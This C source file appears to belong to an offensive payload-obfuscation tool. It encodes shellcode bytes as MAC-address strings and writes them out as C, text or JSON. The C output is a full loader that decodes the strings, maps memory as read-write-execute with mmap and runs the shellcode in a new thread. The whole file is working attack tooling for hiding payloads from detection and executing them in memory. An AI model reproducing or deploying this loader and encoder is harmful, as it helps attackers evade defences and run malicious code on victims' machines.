#include "MacFuscation.h"

typedef struct {
    unsigned char bytes[6];
} MacAddress;

static uint64_t generate_mac_hex(int a, int b, int c, int d, int e, int f) {
    return ((uint64_t)a << 40) | ((uint64_t)b << 32) | 
           ((uint64_t)c << 24) | ((uint64_t)d << 16) | 
           ((uint64_t)e << 8) | f;
}

static void format_mac_address(uint64_t mac, char* output, size_t output_size) {
    unsigned char bytes[6];
    bytes[0] = (mac >> 40) & 0xFF;
    bytes[1] = (mac >> 32) & 0xFF;
    bytes[2] = (mac >> 24) & 0xFF;
    bytes[3] = (mac >> 16) & 0xFF;
    bytes[4] = (mac >> 8) & 0xFF;
    bytes[5] = mac & 0xFF;
    
    snprintf(output, output_size, "%02X-%02X-%02X-%02X-%02X-%02X",
             bytes[0], bytes[1], bytes[2], bytes[3], bytes[4], bytes[5]);
}

bool generate_mac_output(const char* output_file) {
    if (!write_shellcode_file(output_file)) {
        return false;
    }
    
    FILE* f = g_payload.output_file;
    
    fprintf(f, "#include <stdio.h>\n");
    fprintf(f, "#include <stdlib.h>\n");
    fprintf(f, "#include <string.h>\n");
    fprintf(f, "#include <sys/mman.h>\n");
    fprintf(f, "#include <unistd.h>\n");
    fprintf(f, "#include <pthread.h>\n\n");
    
    fprintf(f, "\n");
    fprintf(f, "int parse_mac_string(const char* mac_str, unsigned char* output) {\n");
    fprintf(f, "    unsigned int bytes[6];\n");
    fprintf(f, "    if (sscanf(mac_str, \"%%2x-%%2x-%%2x-%%2x-%%2x-%%2x\",\n");
    fprintf(f, "               &bytes[0], &bytes[1], &bytes[2],\n");
    fprintf(f, "               &bytes[3], &bytes[4], &bytes[5]) != 6) {\n");
    fprintf(f, "        return -1;\n");
    fprintf(f, "    }\n");
    fprintf(f, "    for (int i = 0; i < 6; i++) {\n");
    fprintf(f, "        output[i] = (unsigned char)bytes[i];\n");
    fprintf(f, "    }\n");
    fprintf(f, "    return 0;\n");
    fprintf(f, "}\n\n");
    
    fprintf(f, "int decode_mac_fuscation(const char* mac[], unsigned char* output, int count) {\n");
    fprintf(f, "    int offset = 0;\n\n");
    fprintf(f, "    for (int i = 0; i < count; i++) {\n");
    fprintf(f, "        if (parse_mac_string(mac[i], output + offset) != 0) {\n");
    fprintf(f, "            fprintf(stderr, \"Failed to convert: %%s\\n\", mac[i]);\n");
    fprintf(f, "            return -1;\n");
    fprintf(f, "        }\n");
    fprintf(f, "        offset += 6;\n");
    fprintf(f, "    }\n");
    fprintf(f, "    return 0;\n");
    fprintf(f, "}\n\n");
    
    fprintf(f, "const char* MACShell[] = {\n    ");
    
    int count = 0;
    char mac_str[32];
    
    for (size_t i = 0; i < g_payload.final_size; i += 6) {
        if (i + 5 < g_payload.final_size) {
            uint64_t mac = generate_mac_hex(
                g_payload.p_new_shell[i],
                g_payload.p_new_shell[i + 1],
                g_payload.p_new_shell[i + 2],
                g_payload.p_new_shell[i + 3],
                g_payload.p_new_shell[i + 4],
                g_payload.p_new_shell[i + 5]
            );
            
            format_mac_address(mac, mac_str, sizeof(mac_str));
            
            if (i + 6 >= g_payload.final_size) {
                fprintf(f, "\"%s\"", mac_str);
            } else {
                fprintf(f, "\"%s\", ", mac_str);
            }
            
            count++;
            
            if (count % 6 == 0) {
                fprintf(f, "\n    ");
            }
        }
    }
    
    fprintf(f, "\n};\n\n");
    fprintf(f, "#define ELEMENTS_COUNT %d\n", count);
    fprintf(f, "#define SHELLCODE_SIZE %zu\n\n", g_payload.final_size);
    
    fprintf(f, "int main() {\n");
    fprintf(f, "    unsigned char shellcode[SHELLCODE_SIZE];\n");
    fprintf(f, "    void* exec_mem;\n");
    fprintf(f, "    pthread_t thread;\n\n");
    fprintf(f, "    printf(\"[*] Decoding MAC shellcode...\\n\");\n");
    fprintf(f, "    if (decode_mac_fuscation(MACShell, shellcode, ELEMENTS_COUNT) != 0) {\n");
    fprintf(f, "        return -1;\n");
    fprintf(f, "    }\n\n");
    fprintf(f, "    exec_mem = mmap(NULL, SHELLCODE_SIZE,\n");
    fprintf(f, "                    PROT_READ | PROT_WRITE | PROT_EXEC,\n");
    fprintf(f, "                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n\n");
    fprintf(f, "    if (exec_mem == MAP_FAILED) {\n");
    fprintf(f, "        perror(\"mmap failed\");\n");
    fprintf(f, "        return -1;\n");
    fprintf(f, "    }\n\n");
    fprintf(f, "    memcpy(exec_mem, shellcode, SHELLCODE_SIZE);\n");
    fprintf(f, "    printf(\"[+] Shellcode at: %%p\\n\", exec_mem);\n\n");
    fprintf(f, "    pthread_create(&thread, NULL, (void*(*)(void*))exec_mem, NULL);\n");
    fprintf(f, "    printf(\"[+] Press Enter to exit...\\n\");\n");
    fprintf(f, "    getchar();\n\n");
    fprintf(f, "    munmap(exec_mem, SHELLCODE_SIZE);\n");
    fprintf(f, "    return 0;\n");
    fprintf(f, "}\n");
    
    fclose(f);
    printf("[+] MAC output written to %s\n", output_file);
    return true;
}

bool generate_mac_text_output(const char* output_file) {
    if (!write_shellcode_file(output_file)) {
        return false;
    }

    FILE* f = g_payload.output_file;
    fprintf(f, "const char* MACShell[] = {\n    ");

    int count = 0;
    char mac_str[32];

    for (size_t i = 0; i < g_payload.final_size; i += 6) {
        if (i + 5 < g_payload.final_size) {
            uint64_t mac = generate_mac_hex(
                g_payload.p_new_shell[i],
                g_payload.p_new_shell[i + 1],
                g_payload.p_new_shell[i + 2],
                g_payload.p_new_shell[i + 3],
                g_payload.p_new_shell[i + 4],
                g_payload.p_new_shell[i + 5]
            );

            format_mac_address(mac, mac_str, sizeof(mac_str));

            if (i + 6 >= g_payload.final_size) {
                fprintf(f, "\"%s\"", mac_str);
            } else {
                fprintf(f, "\"%s\", ", mac_str);
            }

            count++;
            if (count % 6 == 0) {
                fprintf(f, "\n    ");
            }
        }
    }

    fprintf(f, "\n};\n");
    fclose(f);
    printf("[+] MAC text output written to %s\n", output_file);
    return true;
}

bool generate_mac_json_output(const char* output_file) {
    if (!write_shellcode_file(output_file)) {
        return false;
    }

    FILE* f = g_payload.output_file;
    fprintf(f, "{\n");
    fprintf(f, "  \"type\": \"mac\",\n");
    fprintf(f, "  \"shellcode_size\": %zu,\n", g_payload.final_size);
    fprintf(f, "  \"obfuscated\": [\n    ");

    int count = 0;
    char mac_str[32];

    for (size_t i = 0; i < g_payload.final_size; i += 6) {
        if (i + 5 < g_payload.final_size) {
            uint64_t mac = generate_mac_hex(
                g_payload.p_new_shell[i],
                g_payload.p_new_shell[i + 1],
                g_payload.p_new_shell[i + 2],
                g_payload.p_new_shell[i + 3],
                g_payload.p_new_shell[i + 4],
                g_payload.p_new_shell[i + 5]
            );

            format_mac_address(mac, mac_str, sizeof(mac_str));

            if (i + 6 >= g_payload.final_size) {
                fprintf(f, "\"%s\"", mac_str);
            } else {
                fprintf(f, "\"%s\", ", mac_str);
            }

            count++;
            if (count % 6 == 0) {
                fprintf(f, "\n    ");
            }
        }
    }

    fprintf(f, "\n  ],\n");
    fprintf(f, "  \"elements_count\": %d\n", count);
    fprintf(f, "}\n");
    fclose(f);
    printf("[+] MAC JSON output written to %s\n", output_file);
    return true;
}
